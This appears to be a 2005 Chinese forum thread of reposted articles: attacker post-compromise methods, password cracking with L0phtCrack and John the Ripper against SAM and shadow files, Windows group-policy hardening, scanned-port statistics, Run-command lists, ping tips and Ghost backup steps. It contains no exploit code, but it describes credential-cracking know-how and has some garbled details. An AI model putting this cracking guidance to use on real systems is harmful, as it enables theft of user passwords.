　　但是，我们观察到，Solaris7(tcp_strong_iss=2)虽然使用了RFC 1948,但是，仍然相当的弱，究其原因，是因为Solaris没有使用外部随机源，而且也没有在一段时间之后重算 

。由一些Solaris系统动态分配IP地址的主机群要特别小心，因为Solaris在启动之后，一直都不会变(这一点与Linux不同)，于是，攻击者在合法拥有某个IP地址的时候，他可以在TCP会话期间对序列号进行大量的采样，然后，当这个IP地址又动态地分配给其他人的时候，他就可以进行攻击（在Clinet-Server结构的网络系统中要尤为注意，因为，许多应用都是分配固定的端口进行通讯）。 
获得信息 

　　一旦攻击者获得root的权限，他将立即扫描服务器的存储信息。例如，在人力资源数据库中的文件，支付账目数据库和属于上层管理的终端用户系统。在进行这一阶段的控制活动时，攻击者在脑海中已经有明确的目标。这一阶段的信息获取比侦查阶段的更具有针对性，该信息只会导致重要的文件和信息的泄漏。这将允许攻击者控制系统。 

　　攻击者获得信息的一种方法是操纵远程用户的Web浏览器。大多数的公司并没有考虑到从HTTP流量带来的威胁，然而，Web浏览器会带来很严重的安全问题。这种问题包括Cross-frame browsing bug和Windows spoofing以及Unicode等。浏览器容易发生缓冲区溢出的问题，允许攻击者对运行浏览器的主机实施拒绝服务攻击。一旦攻击者能够在局部使系统崩溃，他们便可以运行脚本程序来渗透和控制系统。 

　　Cross-frame browsing bug允许怀有恶意的Web站点的制作者创建可以从用户计算机上获得信息的Web页面。这种情况出现在4.x和5.x版本的Netscape和Microsoft浏览器上，这种基于浏览器的问题只会发生在攻击者已经知道文件和目录的存储位置时。这种限制看起来不严重，但实际上并非如此。其实，任何攻击者都清楚地知道缺省情况下UNIX操作系统的重要文件存放在（\etc）目录下，Windows NT的文件在（\winnt）目录下，IIS在（\inetpub\wwwroot）目录下等等。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:56am 

网络安全知识（7） 


大多数的攻击者都知道操作系统存放文件的缺省位置。如果部门的管理者使用Windows98操作系统和Microsoft Word, Excel或Access，他很可能使用\deskto\My Documents目录。攻击者同样知道\windows\start\menu\programs\startup目录的重要性。攻击者可能不知道谁在使用操作系统或文件和目录的布局情况。通过猜测电子表格，数据库和字处理程序缺省存储文件的情况，攻击者可以轻易地获得信息。 

　　虽然攻击者无法通过浏览器控制系统，但这是建立控制的第一步。利用Cross-frame browsing bug获得的信息要比从网络侦查和渗透阶段获得的信息更详细。通过阅读文件的内容，攻击者会从服务器上获得足够的信息，要想阻止这种攻击手段，系统管理员必须从根本上重新配置服务器。 

　　审计UNIX文件系统 

　　Root kit充斥在互联网上，很难察觉并清除它们。从本质上来说，root kit是一种木马。大多数的root kit用各种各样的侦查和记录密码的程序替代了合法的ls，su和ps程序。审计这类程序的最好方法是检查象ls, su和ps等命令在执行时是否正常。大多数替代root kit的程序运行异常，或者有不同的的文件大小。在审计UNIX系统时，要特别注意这些奇怪的现象。下表1列出了常见的UNIX文件的存放位置。 

文件名 
存放位置 

/ 
根目录 

/sbin 
管理命令 

/bin 
用户命令；通常符号连接至/usr/bin 

/usr 
大部分操作系统 

/usr/bin 
大部分系统命令 

/usr/local 
本地安装的软件包 

/usr/include 
包含文件（用于软件开发） 

/usr/src 
源代码 

/usr/local/src 
本地安装的软件包的源代码 

/usr/sbin 
管理命令的另一个存放位置 

/var 
数据（日志文件，假脱机文件） 

/vr/log 
日志文件 

/export 
被共享的文件系统 

/home 
用户主目录 

/opt 
可选的软件 

/tmp 
临时文件 

/proc 
虚拟的文件系统，用来访问内核变量 


　　审计Windows NT 

　　下列出了在Windows NT中通常文件的存放位置 

文件名 
位置 

\winnt 
系统文件目录；包含regedit.exe和注册表日志 

\winnt\system32 
包含许多子目录，包括config（存放security.log，event.log和application.log文件） 

\winnt\profiles 
存放与所有用户相关的信息，包括管理配置文件 

\winnt\system32\config 
包含SAM和SAM.LOG文件，NT注册表还包含密码值 

\inetpub 
缺省情况下，包含IIS4.0的文件，包括\ftproot,\wwwroot 

\program files 
服务器上运行的大多数程序的安装目录 


　　L0phtCrack工具 

　　L0phtCrack被认为是对系统攻击和防御的有效工具。它对于进行目录攻击和暴力攻击十分有效。它对于破解没有使用像！@#￥％^&*()等特殊字符的密码非常迅速。L0phtCrack可以从http://www.l0pht.com上获得。 

　　L0pht使用文字列表对密码进行字典攻击，如果字典攻击失败，它会继续使用暴力攻击。这种组合可以快速获得密码。L0pht可以在各种各样的情况下工作。你可以指定IP地址来攻击Windows NT系统。然而，这种方式需要首先登录到目标机器。L0pht还可以对SAM数据库文件进行攻击。管理员从\winnt\repair目录拷贝出SAM账号数据库。第三中方式是配置运行L0pht的计算机嗅探到密码。L0pht可以监听网络上传输的包含密码的会话包，然后对其进行字典攻击。这种方式使用L0pht需要在类似Windows NT这样的操作系统之上，并且你还需要物理地处于传输密码的两个操作系统之间。 

　　John the Ripper和Crack是在基于UNIX的操作系统上常见的暴力破解密码的程序。这两个工具被用来设计从UNIX上获取密码。所有版本的UNIX操作系统都将用户账号数据库存放在/etc/passwd或/etc/shadow文件中。这些文件在所有UNIX系统中存放在相同的位置。为了使UNIX正常运行，每个用户都必须有读取该文件的权限。 

　　John the Ripper和Crack是最常见的从shadow和passwd文件中获得密码的程序。这些工具将所有的密码组合与passwd或shadow文件中加密的结果进行比较。一旦发现有吻合的结果就说明找到了密码。 

　　在你审计UNIX操作系统时，请注意类似的问题。虽然许多扫描程序，如NetRecon和ISS Internet Scanner可以模仿这种工具类型，许多安全专家还是使用像L0pht和John the Ripper来实施审计工作。 

　　信息重定向 

　　一旦攻击者控制了系统，他便可以进行程序和端口转向。端口转向成功后，他们可以操控连接并获得有价值的信息。例如，有些攻击者会禁止像FTP的服务，然后把FTP的端口指向另一台计算机。那台计算机会收到所有原来那台主机的连接和文件。 

　　相似的攻击目标还包括重定向SMTP端口，它也允许攻击者获得重要的信息。例如，攻击者可以获得所有使用SMTP来传送E-mail账号的电子商务服务器的信息。即使这些传输被加密，攻击者还是可以获得这些传输的信息并用字典攻击这些信息。 

　　通常，攻击者渗透你的操作系统的目的是通过它来渗透到网络上其它的操作系统。例如，NASA服务器是攻击者通常的攻击目标，不仅因为他们想要获取该服务器上的信息，更主要的是许多组织都和该服务器有信任的连接关系，比如Department of Defense。 

　　因此，许多情况下，攻击者希望攻击其它的系统。为了防止类似的情况发生，美国政府要求那些直接连到政府部门的公司必须按照Rainbow Series的标准来实施管理。从1970年开始，该系列标准帮助系统确定谁可以安全的连接。这个系列中最长被使用的是Department of Defense Trusted Computer System Evaluation Criteria，该文件被成为Orange Book。例如，C2标准是由Orange Book衍生出来并被用来实施可以信任的安全等级。这个等级是C2管理服务（C2Config.exe）在Microsoft NT的服务补丁基础上提供的。 
　　控制方法 

　　新的控制方法层出不穷，原因有以下几个。首先是因为系统的升级不可避免的会开启新的安全漏洞，二是少数黑客极有天赋，他们不断开发出新的工具。大多数的UNIX操作系统都有C语言的编译器，攻击者可以建立和修改程序。这一部分讨论一些允许你控制系统的代表性程序。 

　　系统缺省设置 

　　缺省设置是指计算机软硬件“Out-of-the-box”的配置，便于厂商技术支持，也可能是因为缺乏时间或忽略了配置。攻击者利用这些缺省设置来完全控制系统。虽然改变系统的缺省设置非常容易，但许多管理员却忽视了这种改变。其实，改变缺省设置可以极大地增强操作系统的安全性。 

　　合法及非法的服务，守护进程和可装载的模块 

　　Windows NT运行服务，UNIX运行守护进程，Novell操作系统运行可装载的模块。这些守护进程可以被用来破坏操作系统的安全架构。例如，Windows NT的定时服务以完全控制的权限来执行。如果用户开启了定时服务，他就有可能运行其它的服务，（例如，域用户管理器），从而使用户更容易控制系统 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:57am 

防范非系统用户破坏 


第一招：屏幕保护 


在Windows中启用了屏幕保护之后，只要我们离开计算机(或者不操作计算机)的时间达到预设的时间，系统就会自动启动屏幕保护程序，而当用户移动鼠标或敲击键盘想返回正常工作状态时，系统就会打开一个密码确认框，只有输入正确的密码之后才能返回系统，不知道密码的用户将无法进入工作状态，从而保护了数据的安全。 


提示：部分设计不完善的屏幕保护程序没有屏蔽系统的“Ctrl+Alt+Del”的组合键，因此需要设置完成之后测试一下程序是否存在这个重大Bug。 


不过，屏幕保护最快只能在用户离开1分钟之后自动启动，难道我们必须坐在计算机旁等待N分钟看到屏幕保护激活之后才能再离开吗？其实我们只要打开Windows安装目录里面的system子目录，然后找到相应的屏幕保护程序(扩展名是SCR)，按住鼠标右键将它们拖曳到桌面上，选择弹出菜单中的“在当前位置创建快捷方式”命令，在桌面上为这些屏幕保护程序建立一个快捷方式。此后，我们在离开计算机时双击这个快捷方式即可快速启动屏幕保护。 


第二招：巧妙隐藏硬盘 


在“按Web页”查看方式下，进入Windows目录时都会弹出一句警告信息，告诉你这是系统文件夹如果“修改该文件夹的内容可能导致程序运行不正常，要查看该文件夹的内容，请单击显示文件”，这时单击“显示文件”就可以进入该目录了。原因是在Windows根目录下有desktop.ini和folder.htt两个文件作祟。将这两个文件拷贝到某个驱动器的根目录下(由于这两个文件是隐藏文件，之前必须在文件夹选项中单击“查看”标签，选择“显示所有文件”，这样就可以看见这两个文件了)。再按“F5”键刷新一下，看看发生了什么，是不是和进入Windows目录时一样。 


接下来我们用“记事本”打开folder.htt，这是用HTML语言编写的一个文件，发挥你的想像力尽情地修改吧。如果你不懂HTML语言也没关系，先找到“显示文件”将其删除，找到“修改该文件夹的内可能导致程序运行不正常，要查看该文件夹的内容，请单击显示文件”，将其改为自己喜欢的文字，例如“安全重地，闲杂人等请速离开”(如图1)，将“要查看该文件夹的内容，请单击”改为“否则，后果自负!”，接着向下拖动滑块到倒数第9行，找到“(file&://%TEMPLATEDIR%＼wvlogo.gif)”这是显示警告信息时窗口右下角齿轮图片的路径，将其改为自己图片的路径，例如用“d:＼tupian＼tupian1.jpg”替换“//”后面的内容，记住这里必须将图片的后缀名打出，否则将显示不出图片。当然，你还可以用像Dreamweaver、FrontPage这样的网页工具做出更好的效果，然后只要将原文件拷贝到下面这段文字的后面，覆盖掉原文件中“～”之间的内容就可以了。 


*This file was automatically generated by Microsoft Internet EXPlorer 5.0 


*using the file %THISDIRPATH%＼folder.htt. 


保存并退出，按“F5”键刷新一下，是不是很有个性?接下来要作的就是用“超级兔子”将你所要的驱动器隐藏起来，不用重新启动就可以欣赏自己的作品了。最后告诉大家一招更绝的，就是干脆将folder.htt原文件中“～”之间的内容全部删除，这样就会给打开你的驱动器的人造成一种这是一个空驱动器的假象，使其中的文件更安全。 




图1 


第三招：禁用“开始”菜单命令 


在Windows 2000/XP中都集成了组策略的功能，通过组策略可以设置各种软件、计算机和用户策略在某种方面增强系统的安全性。运行“开始→运行”命令，在“运行”对话框的“打开”栏中输入“gpedit.msc”，然后单击“确定”按钮即可启动Windows XP组策略编辑器。在“本地计算机策略”中，逐级展开“用户配置→管理模板→任务栏和开始菜单”分支，在右侧窗口中提供了“任务栏”和“开始菜单”的有关策略。 


在禁用“开始”菜单命令的时候，在右侧窗口中，提供了删除“开始”菜单中的公用程序组、“我的文档”图标、“文档”菜单、“网上邻居”图标等策略。清理“开始”菜单的时候只要将不需要的菜单项所对应的策略启用即可，比如以删除“我的文档”图标为例，具体操作步骤为： 


1)在策略列表窗口中用鼠标双击“从开始菜单中删除我的文档图标”选项。 


2)在弹出窗口的“设置”标签中，选择“已启用”单选按钮，然后单击“确定”即可。 


第四招：桌面相关选项的禁用 


Windows XP的桌面就像你的办公桌一样，有时需要进行整理和清洁。有了组策略编辑器之后，这项工作将变得易如反掌，只要在“本地计算机策略”中展开“用户配置→管理模板→桌面”分支，即可在右侧窗口中显示相应的策略选项。 


1)隐藏桌面的系统图标 


倘若隐藏桌面上的系统图标，传统的方法是通过采用修改注册表的方式来实现，这势必造成一定的风险性，采用组策略编辑器，即可方便快捷地达到此目的。 


若要隐藏桌面上的“网上邻居”和“Internet EXPlorer”图标，只要在右侧窗口中将“隐藏桌面上网上邻居图标”和“隐藏桌面上的Internet EXPlorer图标”两个策略选项启用即可。如果隐藏桌面上的所有图标，只要将“隐藏和禁用桌面上的所有项目”启用即可。当启用了“删除桌面上的我的文档图标”和“删除桌面上的我的电脑图标”两个选项以后，“我的电脑”和“我的文档”图标将从你的电脑桌面上消失了。如果在桌面上你不再喜欢“回收站”这个图标，那么也可以把它给删除，具体方法是将“从桌面删除回收站”策略项启用。 


2)禁止对桌面的某些更改 


如果你不希望别人随意改变计算机桌面的设置，请在右侧窗口中将“退出时不保存设置”这个策略选项启用。当你启用这个了设置以后，其他用户可以对桌面做某些更改，但有些更改，诸如图标和打开窗口的位置、任务栏的位置及大小在用户注销后都无法保存。 


第五招：禁止访问“控制面板” 


如果你不希望其他用户访问计算机的控制面板，你只要运行组策略编辑器，并在左侧窗口中展开“本地计算机策略→用户配置→管理模板→控制面板”分支，然后将右侧窗口的“禁止访问控制面板”策略启用即可。 


此项设置可以防止控制面板程序文件的启动，其结果是他人将无法启动控制面板或运行任何控制面板项目。另外，这个设置将从“开始”菜单中删除控制面板，同时这个设置还从Windows资源管理器中删除控制面板文件夹。 


提示：如果你想从上下文菜单的属性项目中选择一个“控制面板”项目，会出现一个消息，说明该设置防止这个操作。 


第六招：设置用户权限 


当多人共用一台计算机时，在Windows XP中设置用户权限，可以按照以下步骤进行： 


1)运行组策略编辑器程序。 


2)在编辑器窗口的左侧窗口中逐级展开“计算机配置→Windows设置→安全设置→本地策略→用户权限指派”分支。 


3)双击需要改变的用户权限，单击“添加用户或组”按钮，然后双击想指派给权限的用户账号，最后单击“确定”按钮退出。 


第七招：文件夹设置审核 


Windows XP可以使用审核跟踪用于访问文件或其他对象的用户账户、登录尝试、系统关闭或重新启动以及类似的事件，而审核文件和NTFS分区下的文件夹可以保证文件和文件夹的安全。为文件和文件夹设置审核的步骤如下： 


1)在组策略窗口中，逐级展开右侧窗口中的“计算机配置→Windows设置→安全设置→本地策略”分支，然后在该分支下选择“审核策略”选项。 


2)在右侧窗口中用鼠标双击“审核对象访问”选项，在弹出的“本地安全策略设置”窗口中将“本地策略设置”框内的“成功”和“失败”复选框都打上勾选标记(如图2)，然后单击“确定”按钮。 


3)用鼠标右键单击想要审核的文件或文件夹，选择弹出菜单的“属性”命令，接着在弹出的窗口中选择“安全”标签。 


4)单击“高级”按钮，然后选择“审核”标签。 


5)根据具体情况选择你的操作： 


倘若对一个新组或用户设置审核，可以单击“添加”按钮，并且在“名称”框中键入新用户名，然后单击“确定”按钮打开“审核项目”对话框。 


要查看或更改原有的组或用户审核，可以选择用户名，然后单击“查看/编辑”按钮。 


要删除原有的组或用户审核，可以选择用户名，然后单击“删除”按钮即可。 


6)如有必要的话，在“审核项目”对话框中的“应用到”列表中选取你希望审核的地方。 


7)如果想禁止目录树中的文件和子文件夹继承这些审核项目，选择“仅对此容器内的对象和/或容器应用这些审核项”复选框。 


注意：必须是管理员组成员或在组策略中被授权有“管理审核和安全日志”权限的用户可以审核文件或文件夹。在Windows XP审核文件、文件夹之前，你必须启用组策略中“审核策略”的“审核对象访问”。否则，当你设置完文件、文件夹审核时会返回一个错误消息，并且文件、文件夹都没有被审核 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:57am 

黑客扫描特征及易受攻击的端口 

黑客攻击前先扫描 
　　如今，网络上的黑客攻击已经成了家常便饭，自动攻击和计算机蠕虫病毒正以闪电般的速度在网络上蔓延。 今年7月10日到7月23日，Tel Aviv大学的开放端口就曾经被扫描达96000次，它抵挡了来自99个国家，82000名黑客枪林弹雨般的攻击。就此，ForeScout公司开发了一种叫做ActiveScout的防入侵技术，它有助于查明黑客的企图并防止网络攻击。据它观测，现在具有黑客行为的攻击与扫描具有以下特征： 

　　约90%的攻击来自蠕虫 

　　由于蠕虫病毒具有自动攻击和快速繁殖的特性，因此，它占网络攻击的大约90%，通常是系统扫描或同步攻击。其中，大部分网络攻击的来源地是美国。根据ActiveScout的数据，这些蠕虫病毒繁殖迅速，扫描和攻击相隔的时间很短，因此无法人为控制。蠕虫病毒也具有反复攻击的特性，它们会寻找同一端口并大规模入侵这些端口。如果人们不对蠕虫病毒采取防范措施，攻击/扫描的成功率将达到30%，即在10次扫描中，有3次能获得结果并可进行攻击。 

　　96%的扫描集中在端口 

　　端口扫描在网络扫描中大约占了96%，UDP（User Datagram Protocol）服务次之，占3.7%。除了这两种之外，剩余的0.3%是用户名和密码扫描、NetBIOS域登录信息和SNMP管理数据等。Tel Aviv大学已经开始努力防止蠕虫攻击和对NetBIOS弱点的网络攻击，因为这些攻击可能会感染所有的Windows系统。同时，在发送流量之前，要求ISP对所有的NetBIOS流量进行过滤。 

　　有调查表明：在过去的半年中，存在危险性的Internet流量数量已经增加了2倍；暗噪声主要是由网络探测引起的，45%到55%的可疑行为都是黑客对计算机的扫描造成的；大多数攻击都是自动的，小型程序攻击通常来自以前中毒的计算机；黑客攻击这些网络的主要原因是寻找他们能用来传播垃圾邮件、为非法文件寻找特别存储空间的计算机，或者占用可用于下一次攻击的机器。 
10种端口最易受攻击 

　　某组织I-Trap曾经收集了来自24个防火墙12小时工作的数据，这些防火墙分别位于美国俄亥俄州24个企业内网和本地ISP所提供的Internet主干网之间。其间，黑客攻击端口的事件有12000次之多，下表是攻击的详细情况。 

No. 端口号 服务 攻击事件数 说 明 
1 135和445 windows rpc 分别为42次和457次 表明可能感染了最新的windows病毒或蠕虫病毒 
2 57 email 56次 黑客利用fx工具对这个端口进行扫描，寻找微软web服务器弱点 
3 1080，3128， 
6588，8080 代理服务 分别为64、21、21、163次 表示黑客正在进行扫描 
4 25 smtp服务 56次 黑客探测smtp服务器并发送垃圾邮件信号 
5 10000＋ 未注册的服务 376次 攻击这些端口通常会返回流量，原因可能是计算机或防火墙配置不当，或者黑客模拟返回流量进行攻击 
6 161snmp服务 937次 成功获得snmp可能会使黑客完全控制路由器、防火墙或交换机 
7 1433微软sql服务 147次 表明计算机可能已经感染了sql slammer蠕虫病毒 
8 53dns 1797次 表明防火墙或lan配置可能有问题 
9 67引导程序 23次 表明设备可能配置不当
开始..运行..命令集合 


gpedit.msc-----组策略 sndrec32-------录音机
Nslookup-------IP地址侦测器 explorer-------打开资源管理器
logoff---------注销命令 tsshutdn-------60秒倒计时关机命令
lusrmgr.msc----本机用户和组 services.msc---本地服务设置
oobe/msoobe /a----检查XP是否激活 notepad--------打开记事本
cleanmgr-------垃圾整理 net start messenger----开始信使服务
compmgmt.msc---计算机管理 net stop messenger-----停止信使服务
conf-----------启动netmeeting dvdplay--------DVD播放器
charmap--------启动字符映射表 diskmgmt.msc---磁盘管理实用程序
calc-----------启动计算器 dfrg.msc-------磁盘碎片整理程序
chkdsk.exe-----Chkdsk磁盘检查 devmgmt.msc--- 设备管理器
regsvr32 /u *.dll----停止dll文件运行 drwtsn32------ 系统医生
rononce -p ----15秒关机 dxdiag---------检查DirectX信息
regedt32-------注册表编辑器 Msconfig.exe---系统配置实用程序
rsop.msc-------组策略结果集 mem.exe--------显示内存使用情况
regedit.exe----注册表 winchat--------XP自带局域网聊天
progman--------程序管理器 winmsd---------系统信息
perfmon.msc----计算机性能监测程序 winver---------检查Windows版本 
sfc /scannow-----扫描错误并复原
taskmgr-----任务管理器（2000／xp／2003） 

转自草盟网络 

开始-运行 系列命令 

这些东西平时不好找,看到了,就不要错过...
winver---------检查Windows版本 
wmimgmt.msc----打开windows管理体系结构(WMI) 
wupdmgr--------windows更新程序 
wscript--------windows脚本宿主设置 
write----------写字板 
winmsd---------系统信息 
wiaacmgr-------扫描仪和照相机向导 
winchat--------XP自带局域网聊天
mem.exe--------显示内存使用情况 
Msconfig.exe---系统配置实用程序 
mplayer2-------简易widnows media player 
mspaint--------画图板 
mstsc----------远程桌面连接 
mplayer2-------媒体播放机 
magnify--------放大镜实用程序 
mmc------------打开控制台 
mobsync--------同步命令
dxdiag---------检查DirectX信息 
drwtsn32------ 系统医生 
devmgmt.msc--- 设备管理器 
dfrg.msc-------磁盘碎片整理程序 
diskmgmt.msc---磁盘管理实用程序 
dcomcnfg-------打开系统组件服务 
ddeshare-------打开DDE共享设置 
dvdplay--------DVD播放器
net stop messenger-----停止信使服务 
net start messenger----开始信使服务 
notepad--------打开记事本 
nslookup-------网络管理的工具向导 
ntbackup-------系统备份和还原 
narrator-------屏幕“讲述人” 
ntmsmgr.msc----移动存储管理器 
ntmsoprq.msc---移动存储管理员操作请求 
netstat -an----(TC)命令检查接口
syncapp--------创建一个公文包 
sysedit--------系统配置编辑器 
sigverif-------文件签名验证程序 
sndrec32-------录音机 
shrpubw--------创建共享文件夹 
secpol.msc-----本地安全策略 
syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 
services.msc---本地服务设置 
Sndvol32-------音量控制程序 
sfc.exe--------系统文件检查器 
sfc /scannow---windows文件保护
tsshutdn-------60秒倒计时关机命令 
tourstart------xp简介（安装完成后出现的漫游xp程序） 
taskmgr--------任务管理器
eventvwr-------事件查看器 
eudcedit-------造字程序 
explorer-------打开资源管理器
packager-------对象包装程序 
perfmon.msc----计算机性能监测程序 
progman--------程序管理器
regedit.exe----注册表 
rsop.msc-------组策略结果集 
regedt32-------注册表编辑器 
rononce -p ----15秒关机 
regsvr32 /u *.dll----停止dll文件运行 
regsvr32 /u zipfldr.dll------取消ZIP支持
cmd.exe--------CMD命令提示符 
chkdsk.exe-----Chkdsk磁盘检查 
certmgr.msc----证书管理实用程序 
calc-----------启动计算器 
charmap--------启动字符映射表 
cliconfg-------SQL SERVER 客户端网络实用程序 
Clipbrd--------剪贴板查看器 
conf-----------启动netmeeting 
compmgmt.msc---计算机管理 
cleanmgr-------垃圾整理 
ciadv.msc------索引服务程序
osk------------打开屏幕键盘 
odbcad32-------ODBC数据源管理器 
oobe/msoobe /a----检查XP是否激活 
lusrmgr.msc----本机用户和组 
logoff---------注销命令
iexpress-------木马捆绑工具，系统自带
Nslookup-------IP地址侦测器
fsmgmt.msc-----共享文件夹管理器
utilman--------辅助工具管理器
gpedit.msc-----组策略 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:58am 

PING命令及使用技巧 


Ping命令的使用技巧 

Ping是个使用频率极高的实用程序，用于确定本地主机是否能与另一台主机交换（发送与接收）数据报。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数 据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。 

　　简单的说，Ping就是一个测试程序，如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。 

　　按照缺省设置，Windows上运行的Ping命令发送4个ICMP（网间控制报文协议）回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。 

　　1、通过Ping检测网络故障的典型次序 

　　正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障： 

　　・ping 127.0.0.1 
　　这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。 

　　・ping 本机IP 
　　这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。 

　　・ping 局域网内其他IP 
　　这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。 

　　・ping 网关IP 
　　这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。 

　　・ping 远程IP 
　　如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题）。 

　　・ping localhost 
　　localhost是个作系统的网络保留名，它是127.0.0.1的别名，每太计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。 

　　・ping www.xxx.com（如www.yesky.com 天极网） 
　　对这个域名执行Ping www.xxx.com 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。 

　　如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。 

　　2、Ping命令的常用参数选项 

　　・ping IP Ct 
　　连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。 

　　・ping IP -l 3000 
　　指定Ping命令中的数据长度为3000字节，而不是缺省的32字节。 

　　・ping IP Cn 
　　执行特定次数的Ping命令。 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:58am 

GHOST详细解说（1） 

一、分区备份 

　　使用ghost进行系统备份，有整个硬盘（Disk）和分区硬盘（Partition）两种方式。在菜单中点击 Local（本地）项，在右面弹出的菜单中有3个子项，其中 Disk表示备份整个硬盘（即克隆）、Partition 表示备份硬盘的单个分区、Check 表示检查硬盘或备份的文件，查看是否可能因分区、硬盘被破坏等造成备份或还原失败。分区备份作为个人用户来保存系统数据，特别是在恢复和复制系统分区时具有实用价值。
　　选 Local→Partition→To Image 菜单，弹出硬盘选择窗口，开始分区备份操作。点击该窗口中白色的硬盘信息条，选择硬盘，进入窗口，选择要操作的分区（若没有鼠标，可用键盘进行操作：TAB键进行切换，回车键进行确认，方向键进行选择）。 在弹出的窗口中选择备份储存的目录路径并输入备份文件名称，注意备份文件的名称带有 GHO 的后缀名。 接下来，程序会询问是否压缩备份数据，并给出3个选择：No 表示不压缩，Fast表示压缩比例小而执行备份速度较快，High 就是压缩比例高但执行备份速度相当慢。最后选择 Yes 按钮即开始进行分区硬盘的备份。ghost 备份的速度相当快，不用久等就可以完成，备份的文件以 GHO 后缀名储存在设定的目录中。 


二、硬盘克隆与备份 

　　硬盘的克隆就是对整个硬盘的备份和还原。选择菜单Local→Disk→To Disk，在弹出的窗口中选择源硬盘（第一个硬盘），然后选择要复制到的目标硬盘（第二个硬盘）。注意，可以设置目标硬盘各个分区的大小，ghost 可以自动对目标硬盘按设定的分区数值进行分区和格式化。选择 Yes 开始执行。
　　ghost 能将目标硬盘复制得与源硬盘几乎完全一样，并实现分区、格式化、复制系统和文件一步完成。只是要注意目标硬盘不能太小，必须能将源硬盘的数据内容装下。 
　　ghost 还提供了一项硬盘备份功能，就是将整个硬盘的数据备份成一个文件保存在硬盘上（菜单 Local→Disk→To Image），然后就可以随时还原到其他硬盘或源硬盘上，这对安装多个系统很方便。使用方法与分区备份相似。 


三、备份还原 

　　如果硬盘中备份的分区数据受到损坏，用一般数据修复方法不能修复，以及系统被破坏后不能启动，都可以用备份的数据进行完全的复原而无须重新安装程序或系统。当然，也可以将备份还原到另一个硬盘上。 
　　要恢复备份的分区，就在界面中选择菜单Local→Partition→From Image，在弹出窗口中选择还原的备份文件，再选择还原的硬盘和分区，点击 Yes 按钮即可。 


四、局域网操作 

LPT 是通过并口传送备份文件,下面有两个选项：slave 和 master, 分别用以连接主机和客户机。 网络基本输入输出系统 NetBios 和 LPT 相似, 也有 slave 和 master 两个选项, 作用与 LPT 相同。
先和平时一样将要 ghost 的分区做成一个 *.gho 文件，再在一台 win98 上安装Symantec ghost 企业版，重启。 
1. 首先制作一张 ghost 带网卡驱动的启动盘。Start > Programs > Symantec ghost > ghost Boot Wizard－>Network Boot Disk 如果你的网卡在列表内直接选择它就可以生成一张带 PC-DOS 的启动盘。（但 6.5版的生成的软盘经常有问题，不能成功启动）如果你的网卡不在列表内，你要建立专用的 Packet Driver。ADD->Packet Driver (网卡的驱动程序中有)往下根据提示一步一步走，填入工作站的 ip（ghost 一定要 tcp/ip 协议）。最后生成一张软盘，但此软盘仍不能使用，要改 autoexec.bat 文件在 net xxxx.dos 后面加一个16进制的地址，如 0X75 等。多台计算机只需改 wattcp.cfg 文件中的 ip 即可: 
IP = 192.168.100.44 
NETMASK = 255.255.255.0 
GATEWAY = 192.168.100.1 
2. 在 server 端运行 multicast server 出来的画面。先给 server一个Session Name（别名）如：bb，再选择 image file 就是你的 gho 文件。然后 －>Dump From Client->rtitions->More Options-> 在 auto start 的 client 中填入 50（如果你要同时复制50台）->accept client 就算完成了，当你的工作站数达到50台时，server就自动传送*.gho 文件。 

3.详述：
